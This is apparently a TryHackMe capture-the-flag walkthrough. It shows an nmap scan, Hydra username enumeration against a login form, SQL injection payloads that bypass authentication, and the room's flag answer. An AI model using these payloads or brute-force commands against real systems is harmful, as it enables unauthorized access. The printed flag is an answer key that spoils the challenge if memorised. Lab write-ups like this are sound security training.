
# Lesson Learned? — TryHackMe Walkthrough

---

## 🧠 Introduction

Sometimes, the best lessons are the ones you break things to learn.

*Lesson Learned?* is a great example of a room that keeps things simple — but forces you to think carefully about how SQL injection actually works under the hood. It’s not about spraying `'OR 1=1--` and praying. It’s about being subtle, targeted, and aware of the damage you could cause in the real world.

This walkthrough breaks down the process step-by-step — from enumeration to crafting the perfect SQLi — while explaining the logic and risks behind each move.

---

## 🧭 Step 1: Scanning the Box

As always, we start with `nmap` to find out what services are running:

```bash
nmap -T4 -p- -A 10.10.99.121
```

Results:

```
22/tcp open  ssh        OpenSSH 8.4p1 Debian  
80/tcp open  http       Apache httpd 2.4.54 (Debian)
```

So we’ve got a web server on port 80 and SSH. Classic setup.

---

## 🌐 Step 2: Web App — Initial Login Page

Navigating to the web page on port 80 shows a generic-looking login form.

![Screenshot From 2025-05-19 16-23-13](https://github.com/user-attachments/assets/9598fd26-f1e3-459b-b6d3-614da166c045)

Naturally, I tried:

```
Username: admin  
Password: admin
```

No luck.

But when I entered this classic SQLi payload:

```
admin' OR '1'='1
```

… I didn’t get logged in — but I did get a juicy error message.

![Screenshot From 2025-05-19 16-30-08](https://github.com/user-attachments/assets/2b7f62c0-ae45-4a3d-8edb-f40e8e1602a2)

That means the backend is likely doing something like:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

If that’s true, then a properly crafted injection should let us slip in.

---

## 💥 Step 3: Discovering a Valid Username

Here’s the catch: SQLi works best when you inject into a valid user. So I turned to Hydra to brute-force possible usernames and figure out which ones exist:

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p test 10.10.99.121 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

(Use the actual path/params for the login form — this is just illustrative.)

Eventually, we get a bunch of valid usernames. So since there are many I am going to use: **Green**

![Screenshot From 2025-05-19 16-38-27](https://github.com/user-attachments/assets/6e88bea4-943e-4423-94f4-f36bdc8998a8)


---

## 🧪 Step 4: Precision SQL Injection

Using what we’ve gathered, we now craft a *targeted* SQLi payload:

```
Username: Green' AND '1'='1'-- -
Password: (anything)
```

Why this works:

```sql
SELECT * FROM users WHERE username = 'Green' AND '1'='1' -- ' AND password = '...';
```

The `--` comments out the rest, and `AND '1'='1'` makes the condition always true for a valid user. Clean and precise.

And just like that... we're in.

![Screenshot From 2025-05-19 16-48-14](https://github.com/user-attachments/assets/fffff33f-ed29-40d9-a5ba-10aefdaa6b29)

---

## 🏁 Flag Captured

The final page gives us the flag:

```
THM{aab02c6b76bb752456a54c80c2d6fb1e}
```

>Q: What's the flag?  
>A: THM{aab02c6b76bb752456a54c80c2d6fb1e}

---

## 🔐 Conclusion

This room may be short — but it teaches a huge lesson.

Using `'OR 1=1--` might feel like a power move, but in a real environment? It’s a loaded gun. That kind of injection can dump the entire users table or accidentally wipe rows if used in a `DELETE` or `UPDATE` statement. Instead, this box rewards careful, *targeted* payloads — a skill that separates script kiddies from real security testers.

So yes — lesson learned.

> 💡 Be precise. Be subtle. And always understand *why* your payload works.

---
